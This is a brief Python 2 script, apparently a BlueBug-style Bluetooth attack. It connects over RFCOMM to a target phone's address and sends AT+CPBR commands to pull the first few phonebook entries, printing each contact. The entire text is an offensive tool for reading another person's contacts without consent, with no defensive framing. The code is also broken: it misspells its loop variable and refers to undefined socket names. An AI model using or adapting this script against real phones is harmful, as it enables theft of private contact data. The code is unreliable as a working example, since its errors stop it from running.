import bluetooth
tgtPhone = 'AA:BB:BB:DD:EE:FF'
port = 77
phoneSock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
phoneSock.connect((tgtPhone,port))
for contact in range(1,5):
    atCmd = 'AT+CPBR=' +str(conatct)+'\n'
    phoneSock.send(atCmd)
    result = client_sock.recv(1024)
    print '[+]'+str(contact)+':'+result
sock.close()